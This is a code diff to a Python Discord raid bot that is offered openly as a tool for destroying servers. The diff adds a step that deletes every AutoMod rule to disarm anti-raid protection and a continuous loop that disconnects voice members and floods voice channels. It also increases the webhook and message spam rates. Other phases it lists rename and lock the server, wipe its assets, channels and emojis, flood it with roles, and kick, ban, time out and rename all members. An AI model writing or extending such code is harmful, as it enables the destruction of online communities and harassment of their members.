@@ -4,10 +4,12 @@ All delete/create/ban/kick/emoji/role operations use the 100-thread raw HTTP que
 (c-realV2.py port). Continuous channel spam stays async to keep heartbeat alive.
 
 PHASES (all run concurrently from _launch):
+  _automod_wipe   — DELETE all AutoMod rules immediately (disarms anti-raid bot)
   _rename_server  — rename + lock @everyone
   _wipe_assets    — remove icon, banner, description, stickers
   _wipe_emojis    — DELETE all custom emojis via queue
-  _channel_loop   — queue delete all → queue create 100 → async spam → repeat
+  _channel_loop   — CONTINUOUS: nuke all channels → rebuild 300 → spam forever → repeat
+  _voice_chaos    — CONTINUOUS: disconnect all VC members, flood voice channels, loop
   _role_flood     — queue POST 200 raid roles
   _member_ops     — queue kick + ban + timeout + nick all members
 """
@@ -30,11 +32,12 @@ RAID_LINK   = "https://discord.gg/s59zWvzK6c"
 RAID_NAME   = "RAIDED BY JEAN(LORENZO) FROM LAST STAND"
 RAIDER      = "JEAN(LORENZO)"
 CREATE_PER_CYCLE = 300
-WEBHOOKS_PER_CH  = 2
-SPAM_BURST       = 3
+WEBHOOKS_PER_CH  = 5
+SPAM_BURST       = 15
+CYCLE_PAUSE      = 60.0   # seconds to spam before nuking and rebuilding again
 
-_SPAM_SEM = asyncio.Semaphore(25)
-_WH_SEM   = asyncio.Semaphore(15)
+_SPAM_SEM = asyncio.Semaphore(80)
+_WH_SEM   = asyncio.Semaphore(50)
 
 _MSGS = [
     f"@everyone 💀 **{RAID_NAME}** 💀 {RAID_LINK}",
@@ -179,10 +182,12 @@ class Raid(commands.Cog):
         except Exception:
             pass
 
+        bot_state.add_task(asyncio.create_task(self._automod_wipe(guild)))
         bot_state.add_task(asyncio.create_task(self._rename_server(guild)))
         bot_state.add_task(asyncio.create_task(self._wipe_assets(guild)))
         bot_state.add_task(asyncio.create_task(self._wipe_emojis(guild)))
         bot_state.add_task(asyncio.create_task(self._channel_loop(guild)))
+        bot_state.add_task(asyncio.create_task(self._voice_chaos(guild)))
         bot_state.add_task(asyncio.create_task(self._role_flood(guild)))
         bot_state.add_task(asyncio.create_task(self._member_ops(guild, invoker_id)))
 
